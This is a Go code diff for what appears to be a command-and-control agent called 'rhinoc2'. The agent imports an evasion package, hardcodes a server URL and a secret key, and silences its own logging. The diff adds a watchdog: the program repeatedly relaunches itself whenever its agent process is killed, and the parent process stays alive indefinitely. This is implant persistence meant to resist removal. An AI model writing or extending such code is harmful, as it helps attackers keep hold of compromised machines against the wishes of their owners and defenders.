@@ -6,6 +6,7 @@ import (
 	"io"
 	"log"
 	"os"
+	"os/exec"
 	"rhinoc2/pkg/commands"
 	"rhinoc2/pkg/crypto"
 	"rhinoc2/pkg/evasion"
@@ -452,6 +453,16 @@ func (a *Agent) run() {
 }
 
 func main() {
+	// Check if running as watchdog or worker
+	isWatchdog := len(os.Args) > 1 && os.Args[1] == "--watchdog"
+
+	if !isWatchdog {
+		// First run - spawn watchdog and exit
+		runWatchdog()
+		return
+	}
+
+	// Running as actual agent
 	serverURL := "ws://localhost:8443/api/agent"
 	key := "RhinoC2SecretKey2024"
 
@@ -463,4 +474,24 @@ func main() {
 
 	log.SetOutput(io.Discard)
 	agent.run()
+}
+
+func runWatchdog() {
+	// Spawn watchdog that restarts agent if killed
+	exePath, err := os.Executable()
+	if err != nil {
+		return
+	}
+
+	go func() {
+		for {
+			cmd := exec.Command(exePath, "--watchdog")
+			cmd.Start()
+			cmd.Wait()                  // Wait for process to die
+			time.Sleep(2 * time.Second) // Delay before restart
+		}
+	}()
+
+	// Keep main process alive to maintain watchdog
+	select {}
 }
